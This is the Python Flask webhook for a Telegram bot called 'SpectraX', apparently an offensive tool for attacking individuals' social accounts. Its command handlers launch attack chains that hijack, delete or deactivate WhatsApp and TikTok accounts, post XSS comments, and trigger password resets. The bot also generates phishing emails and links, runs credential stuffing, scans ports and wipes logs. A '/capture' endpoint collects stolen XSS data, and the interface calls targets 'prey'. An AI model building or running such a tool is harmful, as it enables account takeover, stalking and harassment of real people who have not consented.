import os
import json
import requests
import threading
import difflib
from flask import Flask, request, jsonify
from orchestrator import Orchestrator
from config import TELEGRAM_TOKEN, SUPER_ADMIN_ID

app = Flask(__name__)
orch = Orchestrator()
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# ---------- Alias mapping ----------
COMMAND_ALIASES = {
    '/start': ['/start', '❓ help', 'help', '/menu', 'start', 'menu'],
    '/track': ['/track', '🔍 track', 'track', '☠️ hunt'],
    '/retrieve': ['/retrieve'],
    '/analyze': ['/analyze', '📊 analyze', 'analyze', '💀 slaughter'],
    '/hack_tiktok': ['/hack_tiktok', '🎯 hack tiktok', 'hack tiktok', '🔥 assassinate'],
    '/hack_wa': ['/hack_wa', '📱 hack whatsapp', 'hack whatsapp', '⚡ terminate'],
    '/verify': ['/verify', '✅ verify', 'verify'],
    '/list': ['/list', '📋 list', 'list', '📋 prey list'],
    '/breach': ['/breach'],
    '/whois': ['/whois'],
    '/dns': ['/dns'],
    '/reverseimage': ['/reverseimage'],
    '/phish': ['/phish'],
    '/stuff': ['/stuff'],
    '/session': ['/session'],
    '/report': ['/report'],
    '/virustotal': ['/virustotal'],
    '/nmap': ['/nmap'],
    '/instagram': ['/instagram', '🌐 stalk instagram'],
    '/twitter': ['/twitter', '🐦 stalk twitter'],
    '/x': ['/x', '🐦 X'],
    '/diagnose': ['/diagnose', '🛡️ diagnostics'],
    '/model': ['/model'],
    '/add_admin': ['/add_admin'],
    '/remove_admin': ['/remove_admin'],
    '/list_admins': ['/list_admins'],
    '/sentiment': ['/sentiment'],
    '/phish_link': ['/phish_link'],
    '/plugin_list': ['/plugin_list'],
    '/plugin_load': ['/plugin_load'],
    '/monitor': ['/monitor'],
    '/record_outcome': ['/record_outcome'],
    '/best_attack': ['/best_attack'],
    '/defensive': ['/defensive'],
    '/share': ['/share'],
    '/unshare': ['/unshare'],
    '/shodan': ['/shodan'],
    '/encrypt': ['/encrypt'],
    '/decrypt': ['/decrypt'],
    '/geolocate': ['/geolocate'],
    '/darkweb': ['/darkweb'],
    '/score': ['/score'],
    '/wa_send': ['/wa_send'],
    '/wa_call': ['/wa_call'],
    '/wa_delete': ['/wa_delete'],
    '/wa_hijack': ['/wa_hijack'],
    '/wa_deactivate': ['/wa_deactivate'],
    '/tt_comment': ['/tt_comment'],
    '/tt_reset': ['/tt_reset'],
    '/tt_follow': ['/tt_follow'],
    '/tt_delete': ['/tt_delete'],
    '/tt_report': ['/tt_report'],
    '/wipe_target': ['/wipe_target'],
    '/ransom': ['/ransom'],
    '/panic': ['/panic'],
    '/anonymize': ['/anonymize'],
    '/wa_chain': ['/wa_chain'],
    '/tt_chain': ['/tt_chain'],
    '/ig_chain': ['/ig_chain'],
    '/x_chain': ['/x_chain'],
    '/ocr': ['/ocr'],   # new
}

def get_command(text):
    text_lower = text.strip().lower()
    for canonical, aliases in COMMAND_ALIASES.items():
        if text_lower in [a.lower() for a in aliases]:
            return canonical
    all_aliases = [item for sublist in COMMAND_ALIASES.values() for item in sublist]
    matches = difflib.get_close_matches(text_lower, all_aliases, n=1, cutoff=0.6)
    if matches:
        for canonical, aliases in COMMAND_ALIASES.items():
            if matches[0] in [a.lower() for a in aliases]:
                return canonical
    return None

# ---------- Helpers ----------
def send_typing(chat_id):
    try:
        requests.post(f"{TELEGRAM_API}/sendChatAction",
                      json={"chat_id": chat_id, "action": "typing"},
                      timeout=5)
    except Exception:
        pass

def send_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    payload = {
        'chat_id': chat_id,
        'text': text[:4096],
        'parse_mode': parse_mode
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        resp = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
        if resp.status_code != 200:
            print(f"Send failed: {resp.status_code} – {resp.text}")
    except Exception as e:
        print(f"Send exception: {e}")

def send_formatted_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    header = "☠️ <b>SPECTRAX</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    footer = "\n━━━━━━━━━━━━━━━━━━━━\n⚡ <b>LETHAL PROTOCOL ACTIVE</b> ⚡"
    full_text = header + text + footer
    send_message(chat_id, full_text, parse_mode, reply_markup)

def process_long_task(chat_id, func, *args, **kwargs):
    def wrapper():
        try:
            result = func(*args, **kwargs)
            if result is None:
                result = {'success': False, 'output': 'No result returned.'}
            def default_serializer(obj):
                if hasattr(obj, 'isoformat'):
                    return obj.isoformat()
                raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
            send_formatted_message(chat_id, json.dumps(result, indent=2, default=default_serializer))
        except Exception as e:
            send_formatted_message(chat_id, f"⚠️ <b>Error:</b> {str(e)}")
    thread = threading.Thread(target=wrapper)
    thread.daemon = True
    thread.start()

def get_main_keyboard():
    return {
        "keyboard": [
            ["☠️ Hunt", "💀 Slaughter"],
            ["🔥 Assassinate", "⚡ Terminate"],
            ["📋 Prey List", "✅ Verify Kill"],
            ["🛡️ Diagnostics", "📄 Execution Report"],
            ["🌐 Stalk Instagram", "🐦 Stalk X"],
            ["❓ Help – Despair"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def is_admin(chat_id):
    return chat_id == SUPER_ADMIN_ID or orch.admin.is_admin(chat_id)

def get_help_text():
    return """
<b>☠️ SPECTRAX – COMMAND MENU</b>

<b>🔵 Reconnaissance</b>
<code>/track &lt;identifier&gt;</code> – OSINT on username/email/phone
<code>/retrieve &lt;tid&gt; &lt;platform&gt;</code> – Retrieve profile (TikTok)
<code>/breach &lt;email&gt;</code> – Check data breaches
<code>/whois &lt;domain&gt;</code> – WHOIS lookup
<code>/dns &lt;domain&gt;</code> – DNS resolution
<code>/reverseimage &lt;url&gt;</code> – Reverse image search
<code>/instagram &lt;username&gt;</code> – Instagram profile
<code>/x &lt;username&gt;</code> – X (Twitter) profile
<code>/geolocate &lt;ip&gt;</code> – IP geolocation
<code>/darkweb &lt;email&gt;</code> – Breach check

<b>🔴 Assassinations</b>
<code>/hack_tiktok &lt;user&gt; &lt;email&gt;</code> – XSS + IDOR (admin)
<code>/hack_wa &lt;phone&gt;</code> – WhatsApp registration check (admin)
<code>/wa_chain &lt;phone&gt;</code> – WhatsApp attack chain (12 steps + 4 actions) (admin)
<code>/tt_chain &lt;username&gt; [video_id]</code> – TikTok attack chain (admin)
<code>/ig_chain &lt;username&gt;</code> – Instagram attack chain (admin)
<code>/x_chain &lt;username&gt;</code> – X (Twitter) attack chain (admin)
<code>/wa_send &lt;phone&gt; &lt;msg&gt;</code> – Send real WhatsApp message (admin)
<code>/wa_call &lt;phone&gt;</code> – Initiate WhatsApp call (admin)
<code>/wa_delete &lt;session&gt;</code> – Delete WhatsApp account (admin)
<code>/wa_hijack &lt;phone&gt; &lt;code&gt;</code> – Hijack WhatsApp (admin)
<code>/wa_deactivate &lt;phone&gt;</code> – Send deactivation request (admin)
<code>/tt_comment &lt;video_id&gt; &lt;comment&gt;</code> – Post XSS comment (admin)
<code>/tt_reset &lt;username&gt; &lt;email&gt;</code> – Trigger password reset (admin)
<code>/tt_follow &lt;username&gt;</code> – Follow target (admin)
<code>/tt_delete &lt;session&gt; &lt;user_id&gt;</code> – Delete TikTok account (admin)
<code>/tt_report &lt;session&gt; &lt;username&gt;</code> – Report TikTok account (admin)
<code>/phish &lt;email&gt; [template]</code> – Generate phishing email (admin)
<code>/phish_link &lt;email&gt;</code> – Shorten phishing link (admin)
<code>/stuff &lt;user&gt; &lt;passwords&gt;</code> – Credential stuffing (admin)
<code>/session &lt;cookie&gt;</code> – Test session cookie (admin)
<code>/nmap &lt;host&gt; [ports]</code> – Port scan (admin)

<b>🟢 Analysis</b>
<code>/analyze &lt;tid&gt;</code> – Risk report
<code>/report &lt;tid&gt;</code> – Generate PDF report
<code>/sentiment &lt;text&gt;</code> – Sentiment analysis
<code>/score &lt;tid&gt;</code> – Target priority score
<code>/best_attack &lt;tid&gt;</code> – Best attack from past outcomes

<b>🟣 Utilities</b>
<code>/list</code> – Show all targets
<code>/verify &lt;tid&gt; &lt;platform&gt;</code> – Verify platform presence
<code>/encrypt &lt;text&gt;</code> – Encrypt text
<code>/decrypt &lt;encrypted&gt;</code> – Decrypt text
<code>/wipe_target &lt;tid&gt;</code> – Delete target and all traces (admin)
<code>/ransom</code> – Simulate ransom note (admin)
<code>/panic</code> – Clear all logs (admin)
<code>/anonymize</code> – Refresh Tor identity (admin)
<code>/ocr</code> – Send an image to extract text (OCR)

<b>⚙️ Admin & System</b>
<code>/diagnose</code> – System diagnostics
<code>/model &lt;provider&gt;</code> – Switch AI (groq/gemini/deepseek/ollama)
<code>/add_admin &lt;user_id&gt;</code> – Add admin (super admin)
<code>/remove_admin &lt;user_id&gt;</code> – Remove admin (super admin)
<code>/list_admins</code> – List admins (super admin)
<code>/defensive</code> – Scan for exposed keys (admin)
<code>/monitor &lt;tid&gt; &lt;chat_id&gt;</code> – Start monitoring (admin)
<code>/record_outcome &lt;tid&gt; &lt;attack&gt; &lt;success&gt;</code> – Record outcome
<code>/share &lt;tid&gt; &lt;user_id&gt;</code> – Share target
<code>/unshare &lt;tid&gt; &lt;user_id&gt;</code> – Unshare target
<code>/plugin_list</code> – List available plugins
<code>/plugin_load &lt;name&gt;</code> – Load plugin

📌 <i>Use /start to see this menu anytime.</i>
"""

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data:
        return 'OK', 200

    if 'callback_query' in data:
        cb = data['callback_query']
        chat_id = cb['message']['chat']['id']
        cb_data = cb['data']
        # Chain callbacks
        if cb_data.startswith('wa_execute_'):
            phone = cb_data.split('_')[2]
            from modules.whatsapp_chain import WhatsAppAttackChain
            chain = WhatsAppAttackChain()
            try:
                chain.prep(phone)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'wa_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        elif cb_data.startswith('tt_execute_'):
            parts = cb_data.split('_')
            username = parts[2]
            video_id = parts[3] if len(parts) > 3 else None
            from modules.tiktok_chain import TikTokAttackChain
            chain = TikTokAttackChain()
            try:
                chain.prep(username, video_id)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'tt_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        elif cb_data.startswith('ig_execute_'):
            username = cb_data.split('_')[2]
            from modules.instagram_chain import InstagramAttackChain
            chain = InstagramAttackChain()
            try:
                chain.prep(username)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'ig_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        elif cb_data.startswith('x_execute_'):
            username = cb_data.split('_')[2]
            from modules.x_chain import XAttackChain
            chain = XAttackChain()
            try:
                chain.prep(username)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'x_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        else:
            send_formatted_message(chat_id, "❓ Unknown callback.")
        return 'OK', 200

    if 'message' not in data:
        return 'OK', 200

    msg = data['message']
    chat_id = msg['chat']['id']
    text = msg.get('text', '').strip()
    if not text:
        return 'OK', 200

    send_typing(chat_id)

    cmd = get_command(text)
    if cmd is None:
        if text.startswith('/'):
            cmd = text.split()[0].lower()
        else:
            send_formatted_message(chat_id, "❓ Unknown command. Type <code>/start</code> or <code>/menu</code> for help.")
            return 'OK', 200

    parts = text.split()
    args = parts[1:] if len(parts) > 1 else []

    try:
        if cmd == '/start' or cmd == '/menu':
            reply = get_help_text()
            send_formatted_message(chat_id, reply, reply_markup=get_main_keyboard())

        elif cmd == '/track':
            if not args:
                reply = "❌ Usage: <code>/track &lt;identifier&gt;</code>\nExample: <code>/track john_doe</code>"
                send_formatted_message(chat_id, reply)
            else:
                ident = args[0]
                send_formatted_message(chat_id, "⏳ Hunting... Please wait.")
                threading.Thread(target=process_long_task, args=(chat_id, orch.track, ident)).start()

        elif cmd == '/retrieve':
            if len(args) < 2:
                reply = "❌ Usage: <code>/retrieve &lt;target_id&gt; &lt;platform&gt;</code>"
                send_formatted_message(chat_id, reply)
            else:
                try:
                    tid = int(args[0])
                    plat = args[1]
                    send_formatted_message(chat_id, f"⏳ Retrieving from {plat}...")
                    threading.Thread(target=process_long_task, args=(chat_id, orch.retrieve, tid, plat)).start()
                except ValueError:
                    send_formatted_message(chat_id, "❌ Invalid target ID. Must be a number.")

        elif cmd == '/analyze':
            if not args or not args[0].isdigit():
                reply = "❌ Usage: <code>/analyze &lt;target_id&gt;</code>\nExample: <code>/analyze 5</code>"
                send_formatted_message(chat_id, reply)
            else:
                tid = int(args[0])
                send_formatted_message(chat_id, f"⏳ Slaughtering analysis...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.analyze, tid)).start()

        elif cmd == '/hack_tiktok':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                reply = "❌ Usage: <code>/hack_tiktok &lt;username&gt; &lt;attacker_email&gt;</code>"
                send_formatted_message(chat_id, reply)
            else:
                username, email = args[0], args[1]
                send_formatted_message(chat_id, f"⏳ Launching assassination on {username}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_tiktok, username, email)).start()

        elif cmd == '/hack_wa':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                reply = "❌ Usage: <code>/hack_wa &lt;phone&gt;</code>\nExample: <code>/hack_wa +2348012345678</code>"
                send_formatted_message(chat_id, reply)
            else:
                phone = args[0]
                send_formatted_message(chat_id, f"⏳ Checking prey for WhatsApp...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_whatsapp, phone)).start()

        elif cmd == '/verify':
            if len(args) < 2:
                reply = "❌ Usage: <code>/verify &lt;target_id&gt; &lt;platform&gt;</code>"
                send_formatted_message(chat_id, reply)
            else:
                try:
                    tid = int(args[0])
                    plat = args[1]
                    send_formatted_message(chat_id, f"⏳ Verifying...")
                    threading.Thread(target=process_long_task, args=(chat_id, orch.verify_target, tid, plat)).start()
                except ValueError:
                    send_formatted_message(chat_id, "❌ Invalid target ID.")

        elif cmd == '/list':
            send_formatted_message(chat_id, "⏳ Fetching prey list...")
            threading.Thread(target=process_long_task, args=(chat_id, orch.list_targets)).start()

        # ---------- Attack Chains ----------
        elif cmd == '/wa_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /wa_chain <phone>")
            else:
                phone = args[0]
                from modules.whatsapp_chain import WhatsAppAttackChain
                chain = WhatsAppAttackChain()
                try:
                    prep_result = chain.prep(phone)
                    if 'error' in prep_result:
                        send_formatted_message(chat_id, f"❌ Error: {prep_result['error']}")
                    else:
                        summary = chain.confirm_summary()
                        keyboard = {
                            "inline_keyboard": [
                                [{"text": "✅ Execute Attack", "callback_data": f"wa_execute_{phone}"}],
                                [{"text": "❌ Cancel", "callback_data": "wa_cancel"}]
                            ]
                        }
                        send_message(chat_id, summary, parse_mode='HTML', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error during preparation: {str(e)}")

        elif cmd == '/tt_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 1:
                send_formatted_message(chat_id, "❌ Usage: /tt_chain <username> [video_id]")
            else:
                username = args[0]
                video_id = args[1] if len(args) > 1 else None
                from modules.tiktok_chain import TikTokAttackChain
                chain = TikTokAttackChain()
                try:
                    prep_result = chain.prep(username, video_id)
                    summary = chain.confirm_summary()
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "✅ Execute Attack", "callback_data": f"tt_execute_{username}_{video_id if video_id else ''}"}],
                            [{"text": "❌ Cancel", "callback_data": "tt_cancel"}]
                        ]
                    }
                    send_message(chat_id, summary, parse_mode='HTML', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")

        elif cmd == '/ig_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /ig_chain <username>")
            else:
                username = args[0]
                from modules.instagram_chain import InstagramAttackChain
                chain = InstagramAttackChain()
                try:
                    prep_result = chain.prep(username)
                    summary = chain.confirm_summary()
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "✅ Execute Attack", "callback_data": f"ig_execute_{username}"}],
                            [{"text": "❌ Cancel", "callback_data": "ig_cancel"}]
                        ]
                    }
                    send_message(chat_id, summary, parse_mode='HTML', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")

        elif cmd == '/x_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /x_chain <username>")
            else:
                username = args[0]
                from modules.x_chain import XAttackChain
                chain = XAttackChain()
                try:
                    prep_result = chain.prep(username)
                    summary = chain.confirm_summary()
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "✅ Execute Attack", "callback_data": f"x_execute_{username}"}],
                            [{"text": "❌ Cancel", "callback_data": "x_cancel"}]
                        ]
                    }
                    send_message(chat_id, summary, parse_mode='HTML', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")

        # ---------- WhatsApp Real Commands ----------
        elif cmd == '/wa_send':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                send_formatted_message(chat_id, "❌ Usage: /wa_send <phone> <message>")
            else:
                phone = args[0]
                msg = ' '.join(args[1:])
                result = orch.send_wa_message(phone, msg)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/wa_call':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /wa_call <phone>")
            else:
                phone = args[0]
                result = orch.hack_wa_call(phone)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/wa_delete':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /wa_delete <session_cookie>")
            else:
                cookie = args[0]
                result = orch.wa_delete(cookie)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/wa_hijack':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                send_formatted_message(chat_id, "❌ Usage: /wa_hijack <phone> <verification_code>")
            else:
                phone, code = args[0], args[1]
                result = orch.wa_hijack(phone, code)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/wa_deactivate':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /wa_deactivate <phone>")
            else:
                phone = args[0]
                result = orch.wa_deactivate(phone)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        # ---------- TikTok Real Commands ----------
        elif cmd == '/tt_comment':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                send_formatted_message(chat_id, "❌ Usage: /tt_comment <video_id> <comment>")
            else:
                vid = args[0]
                comment = ' '.join(args[1:])
                result = orch.hack_tiktok_comment(vid, comment)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/tt_reset':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                send_formatted_message(chat_id, "❌ Usage: /tt_reset <username> <email>")
            else:
                username, email = args[0], args[1]
                result = orch.hack_tiktok_reset(username, email)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/tt_follow':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /tt_follow <username>")
            else:
                username = args[0]
                result = orch.hack_tiktok_follow(username)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/tt_delete':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                send_formatted_message(chat_id, "❌ Usage: /tt_delete <session_cookie> <user_id>")
            else:
                cookie, uid = args[0], args[1]
                result = orch.tt_delete(cookie, uid)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/tt_report':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                send_formatted_message(chat_id, "❌ Usage: /tt_report <session_cookie> <username>")
            else:
                cookie, username = args[0], args[1]
                result = orch.tt_report(cookie, username)
                send_formatted_message(chat_id, json.dumps(result, indent=2))

        # ---------- Fallback ----------
        else:
            reply = "❓ Unknown command. Type <code>/start</code> or <code>/menu</code> for help."
            send_formatted_message(chat_id, reply)

    except Exception as e:
        send_formatted_message(chat_id, f"⚠️ Unexpected error: {str(e)}")

    return 'OK', 200

# ---------- Health & Capture ----------
@app.route('/health', methods=['GET'])
def health():
    try:
        from modules.utils import get_db_connection
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT 1")
        cur.close()
        conn.close()
        db_ok = True
    except Exception as e:
        db_ok = False
        print(f"Health DB check failed: {e}")
    ai_ok = bool(orch.ai.ai_manager.active_provider) if hasattr(orch.ai, 'ai_manager') else False
    return jsonify({
        "status": "ok" if db_ok else "degraded",
        "database": db_ok,
        "ai": ai_ok,
        "service": "SpectraX"
    }), 200 if db_ok else 503

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if data:
        print(f"[XSS CAPTURE] {data}")
        return 'OK', 200
    return 'ERROR', 400

@app.route('/test_ai', methods=['GET'])
def test_ai():
    try:
        result = orch.ai.ai_manager.generate("Say 'hello' in one word.")
        return f"AI works! Response: {result}"
    except Exception as e:
        return f"AI error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
